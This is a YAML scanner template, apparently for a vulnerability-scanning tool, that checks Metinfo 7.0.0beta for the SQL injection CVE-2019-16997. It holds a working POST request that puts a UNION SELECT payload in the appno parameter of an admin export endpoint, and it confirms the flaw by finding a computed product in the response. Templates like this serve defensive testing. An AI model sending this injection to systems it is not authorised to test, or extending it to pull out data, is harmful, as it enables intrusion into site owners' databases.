id: CVE-2019-16997

info:
  name: Metinfo sql inject
  author: JingLing
  severity: high
  verified: false
  description: |
    Metinfo 7.0.0beta is vulnerable to SQL injection via the appno parameter in the /admin/?n=language&c=language_general&a=doExportPack endpoint.
  reference:
    - https://www.exploit-db.com/exploits/48142
    - https://nvd.nist.gov/vuln/detail/CVE-2019-16997
  tags: cve,cve2019,sqli,metinfo
  created: 2023/08/10

set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
rules:
  r0:
    request:
      method: POST
      path: /admin/?n=language&c=language_general&a=doExportPack
      body: |
        appno= 1 union SELECT {{r1}}*{{r2}},1&editor=cn&site=web
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0()
